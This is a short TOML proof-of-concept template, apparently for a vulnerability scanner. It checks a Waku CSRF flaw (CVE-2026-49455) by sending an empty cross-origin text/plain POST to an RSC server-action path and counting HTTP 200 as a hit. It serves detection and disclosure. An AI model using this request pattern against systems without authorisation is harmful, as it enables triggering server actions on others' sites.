[info]
author = "ave"
description = "验证 Waku RSC 请求分发器未校验 Origin/Sec-Fetch-Site 头，跨域 POST 请求（Content-Type: text/plain）可触发注册的 'use server' 服务端操作，返回 HTTP 200 及 RSC stream 响应"
id = "POC-AVE-2026-0308"
name = "Waku Cross-Origin CSRF on RSC Server Action Dispatch PoC"
severity = "medium"
tags = ["ave-2026-0308"]
vuln_id = [
    "CVE-2026-49455",
    "AVE-2026-0308",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/RSC/encoded-action-path"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
Content-Type = "text/plain"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
